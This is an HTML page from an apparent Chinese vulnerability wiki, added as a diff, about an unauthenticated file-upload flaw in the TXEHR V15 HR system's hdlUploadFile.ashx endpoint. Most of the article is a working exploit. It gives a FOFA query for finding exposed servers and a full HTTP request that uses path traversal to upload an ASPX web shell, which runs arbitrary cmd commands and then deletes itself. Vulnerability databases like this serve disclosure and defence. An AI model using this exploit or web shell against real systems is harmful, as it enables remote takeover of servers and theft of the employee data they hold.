@@ -1,0 +1,163 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E5%90%8C%E4%BA%AB%E4%BA%BA%E5%8A%9B%E7%AE%A1%E7%90%86%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0/%E5%90%8C%E4%BA%AB%E4%BA%BA%E5%8A%9B%E8%B5%84%E6%BA%90%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9FhdlUploadFile.ashx%E5%AD%98%E5%9C%A8%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/">
+    <link rel="shortcut icon" href="../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>同享人力资源管理系统hdlUploadFile.ashx存在文件上传漏洞 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "\u540c\u4eab\u4eba\u529b\u8d44\u6e90\u7ba1\u7406\u7cfb\u7edfhdlUploadFile.ashx\u5b58\u5728\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e", url: "#_top", children: [
+              {title: "fofa", url: "#fofa" },
+              {title: "poc", url: "#poc" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../%E5%90%8C%E6%9C%9BOA/%E5%90%8C%E6%9C%9BOA%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%8F%A3tooneAssistantAttachement.jsp%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../%E5%90%8C%E6%9C%9BOA/%E5%90%8C%E6%9C%9BOA%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%8F%A3tooneAssistantAttachement.jsp%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        同望OA系统接口tooneAssistantAttachement.jsp任意文件读取漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../%E5%90%8C%E4%BA%AB%E4%BA%BA%E5%8A%9B%E7%AE%A1%E7%90%86%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0UploadHandler%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../%E5%90%8C%E4%BA%AB%E4%BA%BA%E5%8A%9B%E7%AE%A1%E7%90%86%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0UploadHandler%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        同享人力管理管理平台UploadHandler存在任意文件上传漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="hdluploadfileashx">同享人力资源管理系统hdlUploadFile.ashx存在文件上传漏洞<a class="headerlink" href="#hdluploadfileashx" title="Permanent link">&para;</a></h1>
+<p>同享人力资源管理系统-TXEHR V15 hdlUploadFile.ashx 接口处存在文件上传漏洞，未经身份攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。</p>
+<h2 id="fofa">fofa<a class="headerlink" href="#fofa" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code><span class="nx">body</span><span class="o">=</span><span class="s2">&quot;/Assistant/Default.aspx&quot;</span>
+</code></pre></div>
+<h2 id="poc">poc<a class="headerlink" href="#poc" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code><span class="nx">POST</span><span class="w"> </span><span class="o">/</span><span class="nx">MobileService</span><span class="o">/</span><span class="nx">Web</span><span class="o">/</span><span class="nx">Handler</span><span class="o">/</span><span class="nx">hdlUploadFile</span><span class="p">.</span><span class="nx">ashx</span><span class="o">?</span><span class="nx">puser</span><span class="o">=</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="nx">Style</span><span class="o">/</span><span class="nx">rce</span><span class="w"> </span><span class="nx">HTTP</span><span class="o">/</span><span class="mf">1.1</span>
+<span class="nx">Host</span><span class="o">:</span><span class="w"> </span>
+<span class="nx">User</span><span class="o">-</span><span class="nx">Agent</span><span class="o">:</span><span class="w"> </span><span class="nx">Mozilla</span><span class="o">/</span><span class="mf">5.0</span><span class="w"> </span><span class="p">(</span><span class="nx">Windows</span><span class="w"> </span><span class="nx">NT</span><span class="w"> </span><span class="mf">6.1</span><span class="p">;</span><span class="w"> </span><span class="nx">WOW64</span><span class="p">)</span><span class="w"> </span><span class="nx">AppleWebKit</span><span class="o">/</span><span class="mf">537.36</span><span class="w"> </span><span class="p">(</span><span class="nx">KHTML</span><span class="p">,</span><span class="w"> </span><span class="nx">like</span><span class="w"> </span><span class="nx">Gecko</span><span class="p">)</span><span class="w"> </span><span class="nx">Chrome</span><span class="o">/</span><span class="mf">94.0.2558.72</span><span class="w"> </span><span class="nx">Safari</span><span class="o">/</span><span class="mf">537.36</span>
+<span class="nx">Content</span><span class="o">-</span><span class="nx">Type</span><span class="o">:</span><span class="w"> </span><span class="nx">multipart</span><span class="o">/</span><span class="nx">form</span><span class="o">-</span><span class="nx">data</span><span class="p">;</span><span class="nx">boundary</span><span class="w"> </span><span class="o">=---------------------------</span><span class="mf">142851345723692939351758052805</span>
+<span class="nx">Connection</span><span class="o">:</span><span class="w"> </span><span class="nx">close</span>
+
+<span class="o">-----------------------------</span><span class="mf">142851345723692939351758052805</span>
+<span class="nx">Content</span><span class="o">-</span><span class="nx">Disposition</span><span class="o">:</span><span class="w"> </span><span class="nx">form</span><span class="o">-</span><span class="nx">data</span><span class="p">;</span><span class="w"> </span><span class="nx">name</span><span class="o">=</span><span class="s2">&quot;Filedata&quot;</span><span class="p">;</span><span class="w"> </span><span class="nx">filename</span><span class="o">=</span><span class="s2">&quot;rce.aspx&quot;</span>
+<span class="nx">Content</span><span class="o">-</span><span class="nx">Type</span><span class="o">:</span><span class="w"> </span><span class="nx">text</span><span class="o">/</span><span class="nx">plain</span>
+
+<span class="o">&lt;%</span><span class="err">@</span><span class="w"> </span><span class="nx">Page</span><span class="w"> </span><span class="nx">Language</span><span class="o">=</span><span class="s2">&quot;Jscript&quot;</span><span class="w"> </span><span class="nx">validateRequest</span><span class="o">=</span><span class="s2">&quot;false&quot;</span><span class="w"> </span><span class="o">%&gt;</span>
+<span class="o">&lt;%</span>
+<span class="kd">var</span><span class="w"> </span><span class="nx">c</span><span class="o">=</span><span class="ow">new</span><span class="w"> </span><span class="nx">System</span><span class="p">.</span><span class="nx">Diagnostics</span><span class="p">.</span><span class="nx">ProcessStartInfo</span><span class="p">(</span><span class="s2">&quot;cmd&quot;</span><span class="p">);</span>
+<span class="kd">var</span><span class="w"> </span><span class="nx">e</span><span class="o">=</span><span class="ow">new</span><span class="w"> </span><span class="nx">System</span><span class="p">.</span><span class="nx">Diagnostics</span><span class="p">.</span><span class="nx">Process</span><span class="p">();</span>
+<span class="kd">var</span><span class="w"> </span><span class="nx">out</span><span class="o">:</span><span class="nx">System</span><span class="p">.</span><span class="nx">IO</span><span class="p">.</span><span class="nx">StreamReader</span><span class="p">,</span><span class="nx">EI</span><span class="o">:</span><span class="nx">System</span><span class="p">.</span><span class="nx">IO</span><span class="p">.</span><span class="nx">StreamReader</span><span class="p">;</span>
+<span class="nx">c</span><span class="p">.</span><span class="nx">UseShellExecute</span><span class="o">=</span><span class="kc">false</span><span class="p">;</span>
+<span class="nx">c</span><span class="p">.</span><span class="nx">RedirectStandardOutput</span><span class="o">=</span><span class="kc">true</span><span class="p">;</span>
+<span class="nx">c</span><span class="p">.</span><span class="nx">RedirectStandardError</span><span class="o">=</span><span class="kc">true</span><span class="p">;</span>
+<span class="nx">e</span><span class="p">.</span><span class="nx">StartInfo</span><span class="o">=</span><span class="nx">c</span><span class="p">;</span>
+<span class="nx">c</span><span class="p">.</span><span class="nx">Arguments</span><span class="o">=</span><span class="s2">&quot;/c &quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">Request</span><span class="p">.</span><span class="nx">Item</span><span class="p">[</span><span class="s2">&quot;cmd&quot;</span><span class="p">];</span>
+<span class="nx">e</span><span class="p">.</span><span class="nx">Start</span><span class="p">();</span>
+<span class="nx">out</span><span class="o">=</span><span class="nx">e</span><span class="p">.</span><span class="nx">StandardOutput</span><span class="p">;</span>
+<span class="nx">EI</span><span class="o">=</span><span class="nx">e</span><span class="p">.</span><span class="nx">StandardError</span><span class="p">;</span>
+<span class="nx">e</span><span class="p">.</span><span class="nx">Close</span><span class="p">();</span>
+<span class="nx">Response</span><span class="p">.</span><span class="nx">Write</span><span class="p">(</span><span class="nx">out</span><span class="p">.</span><span class="nx">ReadToEnd</span><span class="p">()</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">EI</span><span class="p">.</span><span class="nx">ReadToEnd</span><span class="p">());</span>
+<span class="nx">System</span><span class="p">.</span><span class="nx">IO</span><span class="p">.</span><span class="nx">File</span><span class="p">.</span><span class="nx">Delete</span><span class="p">(</span><span class="nx">Request</span><span class="p">.</span><span class="nx">PhysicalPath</span><span class="p">);</span>
+<span class="nx">Response</span><span class="p">.</span><span class="nx">End</span><span class="p">();</span><span class="o">%&gt;</span>
+<span class="o">-----------------------------</span><span class="mf">142851345723692939351758052805</span><span class="o">--</span>
+</code></pre></div>
+<p><img alt="img" src="https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202408072336134.png" /></p>
+<p><img alt="img" src="https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202408072337493.png" /></p>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../%E5%90%8C%E6%9C%9BOA/%E5%90%8C%E6%9C%9BOA%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%8F%A3tooneAssistantAttachement.jsp%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../%E5%90%8C%E6%9C%9BOA/%E5%90%8C%E6%9C%9BOA%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%8F%A3tooneAssistantAttachement.jsp%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        同望OA系统接口tooneAssistantAttachement.jsp任意文件读取漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../%E5%90%8C%E4%BA%AB%E4%BA%BA%E5%8A%9B%E7%AE%A1%E7%90%86%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0UploadHandler%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../%E5%90%8C%E4%BA%AB%E4%BA%BA%E5%8A%9B%E7%AE%A1%E7%90%86%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0UploadHandler%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        同享人力管理管理平台UploadHandler存在任意文件上传漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
